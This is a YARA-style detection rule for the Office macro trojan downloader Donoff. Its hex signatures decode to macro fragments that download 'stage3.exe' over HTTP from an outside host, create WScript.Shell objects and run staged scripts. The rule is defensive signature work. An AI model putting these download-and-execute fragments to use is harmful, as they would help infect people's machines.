
rule TrojanDownloader_O97M_Donoff_MXT_MTB{
	meta:
		description = "TrojanDownloader:O97M/Donoff.MXT!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 01 00 "
		
	strings :
		$a_01_0 = {22 48 54 54 50 44 6f 77 6e 6c 6f 61 64 20 27 68 74 74 70 3a 2f 2f 31 6c 78 74 6a 64 69 61 73 2d 70 6f 64 3a 38 30 38 30 2f 73 74 61 67 65 33 2e 65 78 65 27 } //01 00  "HTTPDownload 'http://1lxtjdias-pod:8080/stage3.exe'
		$a_01_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 20 28 22 3b 20 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 3b 20 22 29 } //01 00  CreateObject ("; Scripting.FileSystemObject; ")
		$a_01_2 = {57 73 63 72 69 70 74 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 20 28 22 3b 20 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 3b 20 22 29 } //01 00  Wscript.CreateObject ("; Wscript.Shell; ")
		$a_01_3 = {22 57 73 68 53 68 65 6c 6c 2e 52 75 6e 20 73 74 72 46 69 6c 65 22 } //01 00  "WshShell.Run strFile"
		$a_01_4 = {46 6f 6c 64 65 72 45 78 69 73 74 73 28 4c 65 66 74 28 70 61 74 68 2c 20 49 6e 53 74 72 52 65 76 28 70 61 74 68 } //01 00  FolderExists(Left(path, InStrRev(path
		$a_01_5 = {53 68 65 6c 6c 20 22 77 73 63 72 69 70 74 20 43 3a 5c 44 45 56 5c 56 42 41 5c 73 74 61 67 65 32 2e 76 62 73 22 } //01 00  Shell "wscript C:\DEV\VBA\stage2.vbs"
		$a_01_6 = {66 70 20 3d 20 22 43 3a 5c 44 45 56 5c 56 42 41 5c 73 74 61 67 65 32 2e 76 62 73 22 } //00 00  fp = "C:\DEV\VBA\stage2.vbs"
	condition:
		any of ($a_*)
 
}